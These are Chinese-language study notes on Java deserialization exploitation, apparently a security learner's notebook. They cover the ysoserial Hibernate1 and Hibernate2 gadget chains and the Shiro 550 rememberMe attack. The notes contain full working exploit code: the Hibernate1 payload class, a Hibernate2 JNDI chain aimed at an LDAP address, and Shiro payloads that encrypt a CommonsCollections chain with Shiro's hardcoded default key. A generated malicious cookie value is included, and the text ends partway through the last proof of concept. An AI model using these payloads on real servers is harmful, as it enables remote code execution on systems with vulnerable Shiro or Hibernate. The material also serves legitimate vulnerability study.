![image-20220208103539151](img/image-20220208103539151.png)![image-20220208103539151](file://D:/tools/java%E5%AE%89%E5%85%A8/javasec_learn/img/image-20220208103539151.png?lastModify=1646033842)

逻辑：

- 反射获取所有的方法
- Getter 没有参数，不符合跳过
- Getter方法类型是 BRIDGE 跳过
- 获取方法名，如果开头是 get 或 is，则可能为 getter 方法，sub去掉前缀，并进行首字母大小写处理
- 然后比较获取 getter

这里到最后获取了一个 BasicGetter 对象。参数自定义

```
new BasicGetter(theClass, method, propertyName);
```

我们就可使用其`BasicGetter#get` 方法触发`TemplatesImpl#getOutputProperties`。

那么现在需要

- 在哪里调用 BasicPropertyAccessor#getGetter
- 如何自动调用 BasicGetter#get

#### AbstractComponentTuplizer

抽象类`org.hibernate.tuple.component.AbstractComponentTuplizer` 中定义了`getters`，并可以通过`getPropertyValues()`方法进行调用

![image-20220208104804092](img/image-20220208104804092.png)![image-20220208104804092](file://D:/tools/java%E5%AE%89%E5%85%A8/javasec_learn/img/image-20220208104804092.png?lastModify=1646033842)

但是抽象类我们无法调用，只能使用他的子类，我们使用`PojoComponentTuplizer`，来调用到继承的`getPropertyValue`方法，从而调用到 `BasicGetter#get`。

#### TypedValue

`org.hibernate.engine.spi.TypedValue` 是 final class，用来映射一个Object的值和对应的 Hibernate type。

Hibernate 中定义了一个自己的类型接口 `org.hibernate.type.Hibernate.Type`，用来定义 Java 类型和一个或多个 JDBC 类型之间的映射。针对不同的类型有不同的实现类，开发人员也可以自己实现这个接口来自定义类型。

而 TypedValue 就同时储存一个 Type 和 Object 的映射。上一部分最后提到的 ComponentType 就是 Type 的实现类。

TypedValue 初始化时，除了赋值 type、value 操作外，还调用了 `initTransients` 方法对 hashcode 属性进行了初始化。

![image-20220208105553342](img/image-20220208105553342.png)![image-20220208105553342](file://D:/tools/java%E5%AE%89%E5%85%A8/javasec_learn/img/image-20220208105553342.png?lastModify=1646033842)

初始化时新创建了一个 ValueHolder 对象，并为其赋予了一个新的 DeferredInitializer 对象并重写了 `initialize()` 方法，**这个方法是本条 gadget 的关键。**

![image-20220208105700455](img/image-20220208105700455.png)![image-20220208105700455](file://D:/tools/java%E5%AE%89%E5%85%A8/javasec_learn/img/image-20220208105700455.png?lastModify=1646033842)

我们首先发现TypedValue的`hashCode` 方法调用了`hashcode.getValue` 方法，这个方法有调用了`DeferredInitializer .initialize` 方法，就是之前构造函数调用初始化的那个。

```
public int hashCode() {
    return hashcode.getValue();
}
```

![image-20220208105906857](img/image-20220208105906857.png)![image-20220208105906857](file://D:/tools/java%E5%AE%89%E5%85%A8/javasec_learn/img/image-20220208105906857.png?lastModify=1646033842)

在重写的 `initialize()` 方法里调用了 type 的 `getHashCode()` 方法，并将 value 传入。

![image-20220208110051335](img/image-20220208110051335.png)![image-20220208110051335](file://D:/tools/java%E5%AE%89%E5%85%A8/javasec_learn/img/image-20220208110051335.png?lastModify=1646033842)

那此时如果这个 Type 类型为 ComponentType，则会调用其 getHashCode 方法：

![image-20220208110129178](img/image-20220208110129178.png)![image-20220208110129178](file://D:/tools/java%E5%AE%89%E5%85%A8/javasec_learn/img/image-20220208110129178.png?lastModify=1646033842)

这里调用了`getPropertyValue`，完成了上面链的调用。

![image-20220208110801767](img/image-20220208110801767.png)![image-20220208110801767](file://D:/tools/java%E5%AE%89%E5%85%A8/javasec_learn/img/image-20220208110801767.png?lastModify=1646033842)

用了父类的`getPropertyValue` 

在这里调用了 `getPropertyValue` 方法完成了调用链的构造。而 TypedValue 的 hashCode 方法使用 HashMap#readObject 触发即可 。

## GetterMethodImpl

在 Hibernate1 5.x 里，实现了 `org.hibernate.property.access.spi.GetterMethodImpl` 类，这个类能够替代 `BasicPropertyAccessor$BasicGetter.get()` 来调用 getter 方法。

![image-20220208112254844](img/image-20220208112254844.png)![image-20220208112254844](file://D:/tools/java%E5%AE%89%E5%85%A8/javasec_learn/img/image-20220208112254844.png?lastModify=1646033842)

这个类可直接 new ，用来执行任意方法。

## POC

```
package ysoserial.payloads;


import java.lang.reflect.Array;
import java.lang.reflect.Constructor;
import java.lang.reflect.InvocationTargetException;
import java.lang.reflect.Method;
import java.util.Map;
import java.util.HashMap;

import org.hibernate.engine.spi.TypedValue;
import org.hibernate.tuple.component.AbstractComponentTuplizer;
import org.hibernate.tuple.component.PojoComponentTuplizer;
import org.hibernate.type.AbstractType;
import org.hibernate.type.ComponentType;
import org.hibernate.type.Type;
import org.hibernate.EntityMode;

import ysoserial.payloads.annotation.Authors;
import ysoserial.payloads.annotation.PayloadTest;
import ysoserial.payloads.util.Gadgets;
import ysoserial.payloads.util.JavaVersion;
import ysoserial.payloads.util.PayloadRunner;
import ysoserial.payloads.util.Reflections;


/**
 *
 * org.hibernate.property.access.spi.GetterMethodImpl.get()
 * org.hibernate.tuple.component.AbstractComponentTuplizer.getPropertyValue()
 * org.hibernate.type.ComponentType.getPropertyValue(C)
 * org.hibernate.type.ComponentType.getHashCode()
 * org.hibernate.engine.spi.TypedValue$1.initialize()
 * org.hibernate.engine.spi.TypedValue$1.initialize()
 * org.hibernate.internal.util.ValueHolder.getValue()
 * org.hibernate.engine.spi.TypedValue.hashCode()
 *
 *
 * Requires:
 * - Hibernate (>= 5 gives arbitrary method invocation, <5 getXYZ only)
 *
 * @author mbechler
 */
@Authors({ Authors.MBECHLER })
@PayloadTest(precondition = "isApplicableJavaVersion")
public class Hibernate1 implements ObjectPayload<Object>, DynamicDependencies {
    public static boolean isApplicableJavaVersion() {
        return JavaVersion.isAtLeast(7);
    }

    public static String[] getDependencies () {
        if ( System.getProperty("hibernate5") != null ) {
            return new String[] {
                "org.hibernate:hibernate-core:5.0.7.Final", "aopalliance:aopalliance:1.0", "org.jboss.logging:jboss-logging:3.3.0.Final",
                "javax.transaction:javax.transaction-api:1.2"
            };
        }

        return new String[] {
            "org.hibernate:hibernate-core:4.3.11.Final", "aopalliance:aopalliance:1.0", "org.jboss.logging:jboss-logging:3.3.0.Final",
            "javax.transaction:javax.transaction-api:1.2", "dom4j:dom4j:1.6.1"
        };

    }


    public static Object makeGetter ( Class<?> tplClass, String method ) throws NoSuchMethodException, SecurityException, InstantiationException,
            IllegalAccessException, IllegalArgumentException, InvocationTargetException, ClassNotFoundException {
        if ( System.getProperty("hibernate5") != null ) {
            return makeHibernate5Getter(tplClass, method);
        }
        return makeHibernate4Getter(tplClass, method);
    }


    public static Object makeHibernate4Getter ( Class<?> tplClass, String method ) throws ClassNotFoundException, NoSuchMethodException,
            SecurityException, InstantiationException, IllegalAccessException, IllegalArgumentException, InvocationTargetException {
        Class<?> getterIf = Class.forName("org.hibernate.property.Getter");
        Class<?> basicGetter = Class.forName("org.hibernate.property.BasicPropertyAccessor$BasicGetter");
        Constructor<?> bgCon = basicGetter.getDeclaredConstructor(Class.class, Method.class, String.class);
        Reflections.setAccessible(bgCon);

        if ( !method.startsWith("get") ) {
            throw new IllegalArgumentException("Hibernate4 can only call getters");
        }

        String propName = Character.toLowerCase(method.charAt(3)) + method.substring(4);

        Object g = bgCon.newInstance(tplClass, tplClass.getDeclaredMethod(method), propName);
        Object arr = Array.newInstance(getterIf, 1);
        Array.set(arr, 0, g);
        return arr;
    }


    public static Object makeHibernate5Getter ( Class<?> tplClass, String method ) throws NoSuchMethodException, SecurityException,
            ClassNotFoundException, InstantiationException, IllegalAccessException, IllegalArgumentException, InvocationTargetException {
        Class<?> getterIf = Class.forName("org.hibernate.property.access.spi.Getter");
        Class<?> basicGetter = Class.forName("org.hibernate.property.access.spi.GetterMethodImpl");
        Constructor<?> bgCon = basicGetter.getConstructor(Class.class, String.class, Method.class);
        Object g = bgCon.newInstance(tplClass, "test", tplClass.getDeclaredMethod(method));
        Object arr = Array.newInstance(getterIf, 1);
        Array.set(arr, 0, g);
        return arr;
    }


    public Object getObject ( String command ) throws Exception {
        Object tpl = Gadgets.createTemplatesImpl(command);
        Object getters = makeGetter(tpl.getClass(), "getOutputProperties");
        return makeCaller(tpl, getters);
    }


    static Object makeCaller ( Object tpl, Object getters ) throws NoSuchMethodException, InstantiationException, IllegalAccessException,
            InvocationTargetException, NoSuchFieldException, Exception, ClassNotFoundException {
        if ( System.getProperty("hibernate3") != null ) {
            return makeHibernate3Caller(tpl, getters);
        }
        return makeHibernate45Caller(tpl, getters);
    }


    static Object makeHibernate45Caller ( Object tpl, Object getters ) throws NoSuchMethodException, InstantiationException, IllegalAccessException,
            InvocationTargetException, NoSuchFieldException, Exception, ClassNotFoundException {
        PojoComponentTuplizer tup = Reflections.createWithoutConstructor(PojoComponentTuplizer.class);
        Reflections.getField(AbstractComponentTuplizer.class, "getters").set(tup, getters);

        ComponentType t = Reflections.createWithConstructor(ComponentType.class, AbstractType.class, new Class[0], new Object[0]);
        Reflections.setFieldValue(t, "componentTuplizer", tup);
        Reflections.setFieldValue(t, "propertySpan", 1);
        Reflections.setFieldValue(t, "propertyTypes", new Type[] {
            t
        });

        TypedValue v1 = new TypedValue(t, null);
        Reflections.setFieldValue(v1, "value", tpl);
        Reflections.setFieldValue(v1, "type", t);

        TypedValue v2 = new TypedValue(t, null);
        Reflections.setFieldValue(v2, "value", tpl);
        Reflections.setFieldValue(v2, "type", t);

        return Gadgets.makeMap(v1, v2);
    }


    static Object makeHibernate3Caller ( Object tpl, Object getters ) throws NoSuchMethodException, InstantiationException, IllegalAccessException,
            InvocationTargetException, NoSuchFieldException, Exception, ClassNotFoundException {
        // Load at runtime to avoid dependency conflicts
        Class entityEntityModeToTuplizerMappingClass = Class.forName("org.hibernate.tuple.entity.EntityEntityModeToTuplizerMapping");
        Class entityModeToTuplizerMappingClass = Class.forName("org.hibernate.tuple.EntityModeToTuplizerMapping");
        Class typedValueClass = Class.forName("org.hibernate.engine.TypedValue");

        PojoComponentTuplizer tup = Reflections.createWithoutConstructor(PojoComponentTuplizer.class);
        Reflections.getField(AbstractComponentTuplizer.class, "getters").set(tup, getters);
        Reflections.getField(AbstractComponentTuplizer.class, "propertySpan").set(tup, 1);

        ComponentType t = Reflections.createWithConstructor(ComponentType.class, AbstractType.class, new Class[0], new Object[0]);
        HashMap hm = new HashMap();
        hm.put(EntityMode.POJO, tup);
        Object emtm = Reflections.createWithConstructor(entityEntityModeToTuplizerMappingClass, entityModeToTuplizerMappingClass, new Class[]{ Map.class }, new Object[]{ hm });
        Reflections.setFieldValue(t, "tuplizerMapping", emtm);
        Reflections.setFieldValue(t, "propertySpan", 1);
        Reflections.setFieldValue(t, "propertyTypes", new Type[] {
            t
        });

        Constructor<?> typedValueConstructor = typedValueClass.getDeclaredConstructor(Type.class, Object.class, EntityMode.class);
        Object v1 = typedValueConstructor.newInstance(t, null, EntityMode.POJO);
        Reflections.setFieldValue(v1, "value", tpl);
        Reflections.setFieldValue(v1, "type", t);

        Object v2 = typedValueConstructor.newInstance(t, null, EntityMode.POJO);
        Reflections.setFieldValue(v2, "value", tpl);
        Reflections.setFieldValue(v2, "type", t);

        return Gadgets.makeMap(v1, v2);
    }


    public static void main ( final String[] args ) throws Exception {
        PayloadRunner.run(Hibernate1.class, args);
    }
}
```

# Hibernate2

既然是触发 getter 方法，这就让我们想到了 fastjson 的经典触发方式，除了 TemplatesImpl  实例化恶意类字节码，还有 JdbcRowSetImpl 触发恶意 JNDI 查询，Hibernate2  就是这种方式，不知道这两个漏洞是谁先出的，谁借鉴的谁。

在 fastjson 中使用 JdbcRowSetImpl 的 `setAutoCommit`（setter）方法触发 JNDI 查询，而在 Hibernate2 中由于是触发 getter 方法，因此我们选择 `getDatabaseMetaData`。

![img](img/1627353949746.png)![img](file://D:/tools/java%E5%AE%89%E5%85%A8/javasec_learn/img/1627353949746.png?lastModify=1646033842)

## POC

```
public class Hibernate2 {

	public static String fileName = "Hibernate2.bin";

	public static void main(String[] args) throws Exception {

		Class<?> componentTypeClass             = Class.forName("org.hibernate.type.ComponentType");
		Class<?> pojoComponentTuplizerClass     = Class.forName("org.hibernate.tuple.component.PojoComponentTuplizer");
		Class<?> abstractComponentTuplizerClass = Class.forName("org.hibernate.tuple.component.AbstractComponentTuplizer");


		// 实例化 JdbcRowSetImpl 类
		JdbcRowSetImpl rs = new JdbcRowSetImpl();
		rs.setDataSourceName("ldap://127.0.0.1:23457/Command8");
		Method method = JdbcRowSetImpl.class.getDeclaredMethod("getDatabaseMetaData");

		Object getter;
		try {
			// 创建 GetterMethodImpl 实例，用来触发 TemplatesImpl 的 getOutputProperties 方法
			Class<?>       getterImpl  = Class.forName("org.hibernate.property.access.spi.GetterMethodImpl");
			Constructor<?> constructor = getterImpl.getDeclaredConstructors()[0];
			constructor.setAccessible(true);
			getter = constructor.newInstance(null, null, method);
		} catch (Exception ignored) {
			// 创建 BasicGetter 实例，用来触发 TemplatesImpl 的 getOutputProperties 方法
			Class<?>       basicGetter = Class.forName("org.hibernate.property.BasicPropertyAccessor$BasicGetter");
			Constructor<?> constructor = basicGetter.getDeclaredConstructor(Class.class, Method.class, String.class);
			constructor.setAccessible(true);
			getter = constructor.newInstance(rs.getClass(), method, "databaseMetaData");
		}

		// 创建 PojoComponentTuplizer 实例，用来触发 Getter 方法
		Object tuplizer = SerializeUtil.createInstanceUnsafely(pojoComponentTuplizerClass);

		// 反射将 BasicGetter 写入 PojoComponentTuplizer 的成员变量 getters 里
		Field field = abstractComponentTuplizerClass.getDeclaredField("getters");
		field.setAccessible(true);
		Object getters = Array.newInstance(getter.getClass(), 1);
		Array.set(getters, 0, getter);
		field.set(tuplizer, getters);

		// 创建 ComponentType 实例，用来触发 PojoComponentTuplizer 的 getPropertyValues 方法
		Object type = SerializeUtil.createInstanceUnsafely(componentTypeClass);

		// 反射将相关值写入，满足 ComponentType 的 getHashCode 调用所需条件
		Field field1 = componentTypeClass.getDeclaredField("componentTuplizer");
		field1.setAccessible(true);
		field1.set(type, tuplizer);

		Field field2 = componentTypeClass.getDeclaredField("propertySpan");
		field2.setAccessible(true);
		field2.set(type, 1);

		Field field3 = componentTypeClass.getDeclaredField("propertyTypes");
		field3.setAccessible(true);
		field3.set(type, new Type[]{(Type) type});

		// 创建 TypedValue 实例，用来触发 ComponentType 的 getHashCode 方法
		TypedValue typedValue = new TypedValue((Type) type, null);

		// 创建反序列化用 HashMap
		HashMap<Object, Object> hashMap = new HashMap<>();
		hashMap.put(typedValue, "su18");

		// put 到 hashmap 之后再反射写入，防止 put 时触发
		Field valueField = TypedValue.class.getDeclaredField("value");
		valueField.setAccessible(true);
		valueField.set(typedValue, rs);

		SerializeUtil.writeObjectToFile(hashMap, fileName);
		SerializeUtil.readFileObject(fileName);
	}

}
```

## 总结

1. 利用说明：

   - 前期调用链一样，最后的触发点由 TemplatesImpl 的 `getOutputProperties` 方法换为 JdbcRowSetImpl 的 `getDatabaseMetaData`

2. Gadget 总结：

   - kick-off gadget：`java.util.HashMap#readObject()`
   - sink gadget：`com.sun.rowset.JdbcRowSetImpl#getDatabaseMetaData()`
   - chain gadget：`org.hibernate.tuple.component.PojoComponentTuplizer#getPropertyValues()`

3. 调用链展示：

   ```
   HashMap.readObject()
       TypedValue.hashCode()
           ValueHolder.getValue()
               ValueHolder.DeferredInitializer().initialize()
                   ComponentType.getHashCode()
                       PojoComponentTuplizer.getPropertyValue()
                           AbstractComponentTuplizer.getPropertyValue()
                               BasicPropertyAccessor$BasicGetter.get()/GetterMethodImpl.get()
                                   JdbcRowSetImpl.getDatabaseMetaData()
   ```

4. 版本   Hibernate : 3-5

来自： https://su18.org/post/ysoserial-su18-3/#hibernate2

# Spring1





[https://su18.org/post/ysoserial-su18-3/#stringexecute-%E6%96%B9%E6%B3%95](https://su18.org/post/ysoserial-su18-3/#stringexecute-方法)

https://su18.org/post/ysoserial-su18-4/

https://su18.org/post/ysoserial-su18-5

https://su18.org/post/ysoserial-su18-6/



























# Shiro

## Shiro<1.2.4-RememberMe

**也被称为 Shiro 550。**

可使用 P神写的 demo

https://github.com/phith0n/JavaThings/blob/master/shirodemo

#### 原理

Shiro 默认使用了 `CookieRememberMeManager` ,其处理cookie的流程：

**得到 rememberMe的cookie值 --> base64解码 --> AES解密-->反序列化。**

而shiro<1.2.4版本的AES的密钥是硬编码的，就导致攻击者可以任意构造恶意rememberMe的值造成反序列化。

![image-20220124100829693](img/image-20220124100829693.png)![image-20220124100829693](file://D:/tools/java%E5%AE%89%E5%85%A8/javasec_learn/img/image-20220124100829693.png?lastModify=1646033842)

Shiro 特征：

- 未登陆的情况下，请求包的cookie中没有rememberMe字段，返回包set-Cookie里也没有deleteMe字段
- 登陆失败的话，不管勾选RememberMe字段没有，返回包都会有rememberMe=deleteMe字段
- 不勾选RememberMe字段，登陆成功的话，返回包set-Cookie会有rememberMe=deleteMe字段。但是之后的所有请求中Cookie都不会有rememberMe字段
- 勾选RememberMe字段，登陆成功的话，返回包set-Cookie会有rememberMe=deleteMe字段，还会有rememberMe字段，之后的所有请求中Cookie都会有rememberMe字段

#### CommonsCollections3.2.1 POC

未演示CC链的利用 添加 CC链依赖

```
<dependency>
    <groupId>commons-collections</groupId>
    <artifactId>commons-collections</artifactId>
    <version>3.2.1</version>
</dependency>
```

勾选rememberMe多选框，登陆成功后服务端会返回一个 rememberMe 的 Cookie。

![image-20220124101442951](img/image-20220124101442951.png)![image-20220124101442951](file://D:/tools/java%E5%AE%89%E5%85%A8/javasec_learn/img/image-20220124101442951.png?lastModify=1646033842)

攻击过程：

1. 使用CC链生成序列化 payload
2. 使用shiro 默认 key 加密
3. base 64编码
4. 将其作为 rememberMe 的 cookie 发送给服务端。

依赖：

```
<dependency>
    <groupId>org.apache.shiro</groupId>
    <artifactId>shiro-core</artifactId>
    <version>1.2.4</version>
</dependency>
package shiro;

import com.sun.crypto.provider.AESCipher;
import com.sun.org.apache.xml.internal.security.exceptions.Base64DecodingException;
import org.apache.commons.collections.Transformer;
import org.apache.commons.collections.functors.ChainedTransformer;
import org.apache.commons.collections.functors.ConstantTransformer;
import org.apache.commons.collections.functors.InvokerTransformer;
import org.apache.commons.collections.keyvalue.TiedMapEntry;
import org.apache.commons.collections.map.LazyMap;
import org.apache.shiro.crypto.AesCipherService;
import org.apache.shiro.util.ByteSource;

import java.io.ByteArrayInputStream;
import java.io.ByteArrayOutputStream;
import java.io.ObjectInputStream;
import java.io.ObjectOutputStream;
import java.lang.reflect.Field;
import java.util.Base64;
import java.util.HashMap;
import java.util.HashSet;
import java.util.Map;

public class CC6 {
    public static void setFieldValue(Object obj, String fieldName, Object value) throws Exception {
        Field field = obj.getClass().getDeclaredField(fieldName);
        field.setAccessible(true);
        field.set(obj, value);
    }
    public static void main(String[] args) throws Exception {
        Transformer[] transformers = new Transformer[]{
                new ConstantTransformer(Runtime.class),
                new InvokerTransformer("getMethod",new Class[]{String.class,Class[].class},new Object[]{"getRuntime",null}),
                new InvokerTransformer("invoke",new Class[]{Object.class,Object[].class},new Object[]{null,null}),
                new InvokerTransformer("exec", new Class[]{String.class}, new Object[]{"calc.exe"}),
                new ConstantTransformer(1)
        };

        Transformer fakeChainedTransformer = new ChainedTransformer(new Transformer[]{ new ConstantTransformer(1) });
//        Transformer fakeChainedTransformer = new ChainedTransformer(transformers);


        HashMap innerMap = new HashMap();
        Map outerMap = LazyMap.decorate(innerMap, fakeChainedTransformer);

        TiedMapEntry tiedMapEntry = new TiedMapEntry(outerMap, "foo");

        HashSet hashSet = new HashSet(1);
        hashSet.add(tiedMapEntry);
        outerMap.remove("foo");

        setFieldValue(fakeChainedTransformer,"iTransformers",transformers);

        ByteArrayOutputStream byteArrayOutputStream = new ByteArrayOutputStream();
        ObjectOutputStream objectOutputStream = new ObjectOutputStream(byteArrayOutputStream);
        objectOutputStream.writeObject(hashSet);

        // 将其转化为 shiro 攻击 payload
        AesCipherService aes = new AesCipherService();
        byte[] key = Base64.getDecoder().decode("kPH+bIxk5D2deZiIxcaaaA==");
        ByteSource encrypt = aes.encrypt(byteArrayOutputStream.toByteArray(), key);
        System.out.println(encrypt.toString());
    }
}
```

生成：

```
TM7qT0H6gX+GCq8cF35bokV4kMVqInubhHO0i7qHbWO8EBbtuDxHM8o61pkXMbYxEMn0LZKWv3TRf/pRxB/fta5NppDPqWdkNbZ7IPmNPuub6I0hnajm3+C5blpJTokY1FEiBhE18OoTpO4JhbBFu+ktgpmSjsTyVg6gZ+fzQiaG7bKNkdKDKkDvLWANRPoALHdYAm5sYIn9W8SeoQvEXu9Wsr9kvZ6xBmap6dobll9RJtEv8AMHunfnvYDgdwNIRyFzMOCmT/kQzf9TYYMUTEdVckgRZTjtgRwogCYtPFs+egrXbEVIWa3JvSBtnFYrfVEhI4gMFcV/RUpxUnW/cj5A57lEhBkxK0TTQJgiVZe1wmVAkBB7nzzSiL6uoh9Hmnw8uTiJCfLk1CWKYd5hLQpT9LG2mn2l6eqmc/08+nQfa1DnMcK4z9uJf+xWj9/3qDEaalmhdu9JMu/6ujguZ+dDY0OK2CO9KhjtnYE47ah1vdvzf6PwcEzpoQUrtHKbJ6+1Hz5QBc20Iik+vwwN1j6GXUOXh/rzPc4JNQDLeBMFtbVOvUBQAzTBWr36113D21q0KAEIAp8ZoKzOHZ0OuRl2iW8QULwvRdc61Dv6AIYORksQFzpEnaf8lL2mlwg0GRlm/RzU69hlYM3bMaypb7EDAZvAjySzLiTeIcRAnD4ZsvGzz+zHpUhjFYwVGDDR8h7EJ5zCwlwqA3vZjlBfhTiOQX3RCWmFfvzzAsG6mEI3JYLXNnYxJGDou4Nd2cvG2RGEggwYzreBTtRaW4wR+v1kBXSim1eVJaEFaAIQaJ/xJYG01MVZYnXs3iSJtsKlNkE/kk209vFYIPoXCyvMhwnvgWhpZrZvQnx+0jYeJO1b9bOoP8L/hN3JFR4mMB1LTRsVJoCHsTPEKzke8RGTnSrLnKv7TI0KxjQ3E+Df0tp86etJkz4wrALkxcdopHfl+AIOtMYMlefWFKckH35bnHTm0koWShC0nRGcok/MHbam0Pgxdotcx0036pp4k4baa8y1LNRlaSZyUTpx2hHgmfvmD2hOxbENL4lHHRuTnc+c35x9rzcZNDrEdEhEFyreVPXlVJ3NOM1M01SWXwIKuawlrLwhfnPOKKNjRxoU3sqO5OcobD/2jnGDbxCIFeOUvXEsBltoFVVIJNK4Sn+CeT5/ng0S0ZkfLQGHMpCS4x8MXPqIiMWVpSbA9QUwm7clg4Oiv26qCR21zp6220jBeUi79gJtmDuAX93Eez+aUuwukzc6nDfQ29Gu0l7OgdsxEdmGZp32bdS1BJrw9+C5xWxrsq1fl2THUcd+ZAhVbl8ufydFRUXaLGlmMG2OFlhiQqurZCDp4dXGh5WCvbbc27j6cxmPw3hJEFN0KbZZMOH2b2bJOeLh/UpOiv+NgmoatPo133NVoY09nU6ALx5RztC57F8SXVXEWblpXEzYz3i7vqPIYU3xPhP2/iCTLHvQ4IYHRrMspS9qOhQWVKxFfOB12UXxU7DBqZwLkfCBH51Nthby7zVpoV+327FQz7c6ffGw7UIPVQWqVF3BLB0x5T7Q8IMnzjWeopXRrtuRhdvVM6Jvqi3f6LNYZEeUl8Pk5XLSO5vEetyX9MnoES3WluUZOkaw9+V0XY0vyNPaccqmXgrnpHzqlBXfBVD8w0vNqxCycjptNJeZDhQpfYkRkLo=
```

作为 Cookie 的 rememberMe 值发包，但是并没有执行命令，而是报错了。

##### 解决报错

![image-20220124103456119](img/image-20220124103456119.png)![image-20220124103456119](file://D:/tools/java%E5%AE%89%E5%85%A8/javasec_learn/img/image-20220124103456119.png?lastModify=1646033842)

最后一行`org.apache.shiro.io.ClassResolvingObjectInputStream` ，这是 `shiro` 的子类，其重写了`resolveClass` 方法

```
package org.apache.shiro.io;

import java.io.IOException;
import java.io.InputStream;
import java.io.ObjectInputStream;
import java.io.ObjectStreamClass;
import org.apache.shiro.util.ClassUtils;
import org.apache.shiro.util.UnknownClassException;

public class ClassResolvingObjectInputStream extends ObjectInputStream {
    public ClassResolvingObjectInputStream(InputStream inputStream) throws IOException {
        super(inputStream);
    }

    protected Class<?> resolveClass(ObjectStreamClass osc) throws IOException, ClassNotFoundException {
        try {
            return ClassUtils.forName(osc.getName());
        } catch (UnknownClassException var3) {
            throw new ClassNotFoundException("Unable to load ObjectStreamClass [" + osc + "]: ", var3);
        }
    }
}
```

`resolveClass` 是反序列化中用来查找类的方法，也就是读取到一个字符串类名，然后通过这个方法找到对应的`java.lang.Class` 对象。

正常的`ObjectInputStream#resolveClass` :

```
protected Class<?> resolveClass(ObjectStreamClass desc)
    throws IOException, ClassNotFoundException
{
    String name = desc.getName();
    try {
        return Class.forName(name, false, latestUserDefinedLoader());
    } catch (ClassNotFoundException ex) {
        Class<?> cl = primClasses.get(name);
        if (cl != null) {
            return cl;
        } else {
            throw ex;
        }
    }
}
```

区别：

前者用的是`Classutils#forName` (实际上是`org.apache.catalina.loader.ParallelWebappClassLoader#loadClass`) ,后者调用的是 java 原生的`Class.forName` 。

打断点查看

![image-20220124104459909](img/image-20220124104459909.png)![image-20220124104459909](file://D:/tools/java%E5%AE%89%E5%85%A8/javasec_learn/img/image-20220124104459909.png?lastModify=1646033842)

出异常时加载的类名为 [Lorg.apache.commons.collections.Transformer; 。这个类名看起怪，其实就是表示 org.apache.commons.collections.Transformer 的数组。

**如果反序列化流中包含非java自身的数组，则会出现无法加载类的错误。而这里CC6用到了 Transformer数组。**

##### 构造不含数组的反序列化Gadget

Orange师傅文章中用到了JRMP的方式： http://blog.orange.tw/2018/03/pwn-ctf-platform-with-java-jrmp-gadget.html

我们也可以使用其他方法。

可以使用 javassist + TemplatesImpl 替换这里

```
Transformer[] transformers = new Transformer[]{
    new ConstantTransformer(Runtime.class),
    new InvokerTransformer("getMethod",new Class[]{String.class,Class[].class},new Object[]{"getRuntime",null}),
    new InvokerTransformer("invoke",new Class[]{Object.class,Object[].class},new Object[]{null,null}),
    new InvokerTransformer("exec", new Class[]{String.class}, new Object[]{"calc.exe"}),
    new ConstantTransformer(1)
};
```

为：

```
ClassPool pool = ClassPool.getDefault();
CtClass cc3 = pool.makeClass("shiro");
cc3.setSuperclass(pool.get("com.sun.org.apache.xalan.internal.xsltc.runtime.AbstractTranslet"));
cc3.makeClassInitializer().setBody("java.lang.Runtime.getRuntime().exec(\"calc.exe\");");
byte[] code = cc3.toBytecode();

TemplatesImpl obj = new TemplatesImpl();
setFieldValue(obj,"_bytecodes",new byte[][]{code});
setFieldValue(obj,"_name","test");
setFieldValue(obj,"_tfactory",new TransformerFactoryImpl());
```

但是这里是需要`obj.new Transformer()` 来触发的，

```
Transformer[] transformers = new Transformer[]{ 
    new ConstantTransformer(obj), 
    new InvokerTransformer("newTransformer", null, null) 
};
```

这里又引入了数组。

在CC6  `TiedMapEntry` 中，其构造函数接收两个参数，参数1是`Map` ,参数2是`Object key` 。

`TiedMapEntry` 类有个`getValue` 方法，调用了 map 的 get 方法，并传入 key ：

```
public Object getValue() {
    return map.get(key);
}
```

当 map 是 `LazyMap` 时，其 get 方法就是触发 transform 的关键点：

```
public Object get(Object key) {
    // create value for key if key is not currently in the map
    if (map.containsKey(key) == false) {
        Object value = factory.transform(key);
        map.put(key, value);
        return value;
    }
    return map.get(key);
}
```

之前使用 `LazyMap#get` 方法的参数没有用到过。因为通常 Transformer 数组的首个对象是 `ConstantTransformer`， 通过它来初始化对象。

但是此时无法使用数组了，也不能使用`ConstantTransformer` 相互调用了。但是，这里的`LazyMap#get`的参数key，会被传进`transfoem` 里，那么它可以扮演`ConstantTransformer`的角色，

再看之前的数组：

```
Transformer[] transformers = new Transformer[]{ 
    new ConstantTransformer(obj), 
    new InvokerTransformer("newTransformer", null, null) 
};
```

`new ConstantTransformer(obj),` 可以去除了，数组也就无了。

这里可直接利用参数 input 反射调用任意方法。

![image-20220124111908136](img/image-20220124111908136.png)![image-20220124111908136](file://D:/tools/java%E5%AE%89%E5%85%A8/javasec_learn/img/image-20220124111908136.png?lastModify=1646033842)

##### POC

```
package shiro;

import com.sun.org.apache.xalan.internal.xsltc.trax.TemplatesImpl;
import com.sun.org.apache.xalan.internal.xsltc.trax.TransformerFactoryImpl;
import javassist.ClassPool;
import javassist.CtClass;
import org.apache.commons.collections.Transformer;
import org.apache.commons.collections.functors.ChainedTransformer;
import org.apache.commons.collections.functors.ConstantTransformer;
import org.apache.commons.collections.functors.InvokerTransformer;
import org.apache.commons.collections.keyvalue.TiedMapEntry;
import org.apache.commons.collections.map.LazyMap;
import org.apache.shiro.crypto.AesCipherService;
import org.apache.shiro.util.ByteSource;

import java.io.ByteArrayOutputStream;
import java.io.ObjectOutputStream;
import java.lang.reflect.Field;
import java.util.Base64;
import java.util.HashMap;
import java.util.HashSet;
import java.util.Map;

public class POC1 {
    public static void setFieldValue(Object obj, String fieldName, Object value) throws Exception {
        Field field = obj.getClass().getDeclaredField(fieldName);
        field.setAccessible(true);
        field.set(obj, value);
    }
    public static void main(String[] args) throws Exception {
        ClassPool pool = ClassPool.getDefault();
        CtClass cc3 = pool.makeClass("Shiro");
        cc3.setSuperclass(pool.get("com.sun.org.apache.xalan.internal.xsltc.runtime.AbstractTranslet"));
        cc3.makeClassInitializer().setBody("java.lang.Runtime.getRuntime().exec(\"calc.exe\");");
        byte[] code = cc3.toBytecode();

        TemplatesImpl obj = new TemplatesImpl();
        setFieldValue(obj,"_bytecodes",new byte[][]{code});
        setFieldValue(obj,"_name","test");
        setFieldValue(obj,"_tfactory",new TransformerFactoryImpl());

        Transformer transformer = new InvokerTransformer("getClass", null, null);

        HashMap innerMap = new HashMap();
        Map outerMap = LazyMap.decorate(innerMap, transformer);

        TiedMapEntry tiedMapEntry = new TiedMapEntry(outerMap, obj);

        HashSet hashSet = new HashSet(1);
        hashSet.add(tiedMapEntry);
        outerMap.clear();

        setFieldValue(transformer,"iMethodName","newTransformer");

